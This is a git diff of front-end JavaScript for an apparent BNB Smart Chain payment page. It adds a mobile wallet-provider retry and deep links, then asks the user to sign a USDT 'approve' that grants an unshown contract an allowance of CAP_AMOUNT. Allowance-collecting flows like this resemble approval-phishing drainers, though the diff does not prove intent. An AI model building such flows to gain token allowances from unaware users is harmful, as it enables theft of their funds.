@@ -39,8 +39,6 @@ if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
 // Wake up Render backend
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
-let _cachedAddress = null;
-
 // ─── UI helpers ───────────────────────────────────────────────────────────────
 let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
@@ -59,7 +57,27 @@ function setLoading(on, label = "Processing…") {
   if (btnSpinner) btnSpinner.hidden   = !on;
 }
 
-// ─── Modal de Selección Nativa (Con esquema oficial de OKX y encodeURIComponent) ───
+// ─── Proveedor Seguro para Webviews Móviles (Con reintentos) ───────────────────
+async function getEthereumProvider() {
+  if (window.ethereum) return window.ethereum;
+
+  // Las wallets móviles inyectan window.ethereum con retraso en sus webviews
+  return new Promise((resolve) => {
+    let checks = 0;
+    const interval = setInterval(() => {
+      checks++;
+      if (window.ethereum) {
+        clearInterval(interval);
+        resolve(window.ethereum);
+      } else if (checks > 25) { // Espera máxima de 2.5 segundos
+        clearInterval(interval);
+        resolve(null);
+      }
+    }, 100);
+  });
+}
+
+// ─── Modal Nativo con Deeplinks Corregidos ────────────────────────────────────
 function showMobileWalletSelector() {
   let modal = document.getElementById("mobileWalletModal");
   
@@ -73,11 +91,12 @@ function showMobileWalletSelector() {
     modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;";
 
     modal.innerHTML = `
-      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;">
+      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;font-family:sans-serif;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
-          <h3 style="margin:0;font-size:18px;">Selecciona tu Billetera</h3>
+          <h3 style="margin:0;font-size:18px;">Abrir en Billetera</h3>
           <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;">&times;</button>
         </div>
+        <p style="font-size:13px;color:#a1a1aa;margin-bottom:16px;">Selecciona tu aplicación para conectar de forma segura:</p>
         <div style="display:flex;flex-direction:column;gap:10px;">
           <a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">Trust Wallet</a>
           <a href="https://metamask.app.link/dapp/${urlNoProtocol}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">MetaMask</a>
@@ -91,10 +110,6 @@ function showMobileWalletSelector() {
     document.getElementById("closeWalletModal").addEventListener("click", () => { modal.style.display = "none"; });
     modal.addEventListener("click", (e) => { if (e.target === modal) modal.style.display = "none"; });
   } else {
-    modal.querySelector('a[href*="trustwallet"]').href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}`;
-    modal.querySelector('a[href*="metamask"]').href = `https://metamask.app.link/dapp/${urlNoProtocol}`;
-    modal.querySelector('a[href*="safepal"]').href = `https://link.safepal.io/open_url?url=${encodedUrl}`;
-    modal.querySelector('a[href*="okx"]').href = `okx://wallet/dapp/url?dappUrl=${encodedUrl}`;
     modal.style.display = "flex";
   }
 }
@@ -102,7 +117,13 @@ function showMobileWalletSelector() {
 // ─── Main Execution Handler ───────────────────────────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
-    if (!window.ethereum) {
+    setLoading(true, "Verificando entorno…");
+
+    // Intentamos obtener el proveedor con espera activa para móviles
+    const provider = await getEthereumProvider();
+
+    if (!provider) {
+      setLoading(false);
       if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
         showMobileWalletSelector();
       } else {
@@ -111,10 +132,9 @@ if (approveBtn) {
       return;
     }
 
-    setLoading(true, "Conectando…");
-
     try {
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      setLoading(true, "Conectando…");
+      const accounts = await provider.request({ method: "eth_requestAccounts" });
       const userAddress = accounts?.[0];
 
       if (!userAddress) {
@@ -123,13 +143,14 @@ if (approveBtn) {
         return;
       }
 
-      const currentChain = await window.ethereum.request({ method: "eth_chainId" });
+      // Validación de red BSC
+      const currentChain = await provider.request({ method: "eth_chainId" });
       if (currentChain !== BSC_CHAIN_ID_HEX) {
         try {
-          await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID_HEX }] });
+          await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID_HEX }] });
         } catch (switchError) {
           if (switchError.code === 4902) {
-            await window.ethereum.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_PARAMS] });
+            await provider.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_PARAMS] });
           } else {
             showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
             setLoading(false);
@@ -144,7 +165,7 @@ if (approveBtn) {
       setLoading(true, "Firma requerida en wallet…");
       const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
 
-      const txHash = await window.ethereum.request({
+      const txHash = await provider.request({
         method: "eth_sendTransaction",
         params: [{ from: userAddress, to: BSC_USDT_ADDRESS, data: approveData, value: "0x0" }]
       });
